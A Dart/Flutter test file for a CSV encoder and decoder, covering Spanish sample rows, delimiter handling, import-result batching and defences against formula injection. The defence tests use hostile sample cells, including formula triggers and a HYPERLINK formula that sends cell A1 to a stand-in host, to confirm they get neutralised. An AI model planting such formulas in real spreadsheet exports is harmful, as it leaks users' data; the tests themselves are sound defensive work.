import 'package:flutter_test/flutter_test.dart';
import 'package:ottos_core/ottos_core.dart';

void main() {
  test('round-trips accents, separators, quotes and line breaks', () {
    final rows = [
      ['nombre', 'dirección', 'notas'],
      ['Rosa Martínez', 'Calle 10; #1', 'Dijo "llamar antes"\nsegunda línea'],
      ['Ana', '', null],
    ];

    final text = Csv.encode(rows);

    expect(text.startsWith(Csv.bom), isTrue, reason: 'Excel needs it to read UTF-8');
    expect(Csv.decode(text), [
      ['nombre', 'dirección', 'notas'],
      ['Rosa Martínez', 'Calle 10; #1', 'Dijo "llamar antes"\nsegunda línea'],
      ['Ana', '', ''],
    ]);
  });

  test('keeps blank lines in between, so rows keep their numbers', () {
    expect(Csv.decode('a;b\n1;2\n\n3;4\n'), [
      ['a', 'b'],
      ['1', '2'],
      [''],
      ['3', '4'],
    ]);
  });

  test('reads files saved with commas or tabs, and skips blank lines at the end', () {
    expect(Csv.decode('a,b\r\n1,"2,5"\r\n\r\n,\r\n'), [
      ['a', 'b'],
      ['1', '2,5'],
    ]);
    expect(Csv.decode('a\tb\n1\t2'), [
      ['a', 'b'],
      ['1', '2'],
    ]);
  });

  test('an import result adds batches and lists what was rejected', () {
    ImportResult batch(String ref, String status) => ImportResult.fromJson({
      'dryRun': true,
      'summary': {'customersCreated': status == 'CREATED' ? 1 : 0, 'customersRejected': status == 'REJECTED' ? 1 : 0},
      'results': [
        {
          'index': 0,
          'ref': ref,
          'status': status,
          'code': status == 'REJECTED' ? 'INVALID_PHONE' : null,
          'beneficiaries': [
            {'index': 0, 'ref': ref, 'status': 'REJECTED', 'code': 'UNKNOWN_MUNICIPALITY'},
          ],
        },
      ],
    });

    final result = batch('fila 2', 'CREATED') + batch('fila 3', 'REJECTED');

    expect(result.customersCreated, 1);
    expect(result.customersRejected, 1);
    expect(result.rejected.map((item) => '${item.ref} ${item.code}'), [
      'fila 2 UNKNOWN_MUNICIPALITY',
      'fila 3 INVALID_PHONE',
      'fila 3 UNKNOWN_MUNICIPALITY',
    ]);
  });

  group('SEC-3', () {
    test('SEC-3: prefixes every formula trigger with a quote', () {
      for (final value in ['=1+1', '+5355551234', '-2+3', '@SUM(A1)', '\tcmd', '\rcmd']) {
        expect(Csv.neutralizeFormula(value), "'$value", reason: 'value ${value.codeUnits}');
      }
    });

    test('SEC-3: a HYPERLINK formula goes out as quoted text', () {
      final text = Csv.encode([
        ['notas'],
        ['=HYPERLINK("https://example.test/?"&A1;"ver")'],
      ]);

      expect(text, contains('"\'=HYPERLINK(""https://example.test/?""&A1;""ver"")"'));
      expect(Csv.decode(text)[1].single, '\'=HYPERLINK("https://example.test/?"&A1;"ver")');
    });

    test('SEC-3: negative numbers stay numbers', () {
      for (final value in ['-150', '-150,00', '-1.234,56', '-1234.5', '0', '12,5']) {
        expect(Csv.neutralizeFormula(value), value);
      }
      expect(
        Csv.encode([
          ['-1.234,56', '-5'],
        ]),
        '${Csv.bom}-1.234,56;-5\r\n',
      );
    });

    test('SEC-3: values that only look like numbers are still neutralised', () {
      for (final value in ['-1+2', '-1,5)*cmd', '-', '+1', '-A1']) {
        expect(Csv.neutralizeFormula(value), "'$value");
      }
    });

    test('SEC-3: plain text and empty cells are unchanged', () {
      for (final value in ['', 'Rosa', "'ya citado", 'Calle 10 - esquina', '5352223344']) {
        expect(Csv.neutralizeFormula(value), value);
      }
    });

    test('SEC-3: restoreFormula undoes the prefix and nothing else', () {
      for (final value in ['=1+1', '+5355551234', '-2+3', '@SUM(A1)', '\tcmd']) {
        expect(Csv.restoreFormula(Csv.neutralizeFormula(value)), value);
      }
      expect(Csv.restoreFormula("'Pepe"), "'Pepe");
      expect(Csv.restoreFormula("'"), "'");
    });
  });
}
